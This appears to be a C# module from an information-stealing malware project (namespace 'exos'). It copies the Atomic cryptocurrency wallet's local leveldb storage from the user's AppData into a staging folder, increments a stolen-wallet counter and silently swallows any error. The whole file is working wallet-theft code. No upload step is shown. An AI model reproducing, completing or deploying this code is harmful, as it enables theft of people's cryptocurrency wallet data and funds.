using System.IO;

namespace exos;

internal class AtomicWallet
{
	public static int count = 0;

	public static string AtomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";

	public static void AtomicStr(string directorypath)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Helper.AppData + "\\atomic\\Local Storage\\leveldb\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(directorypath + AtomDir);
				fileInfo.CopyTo(directorypath + AtomDir + fileInfo.Name);
			}
			count++;
			Counting.Wallets++;
		}
		catch
		{
		}
	}
}
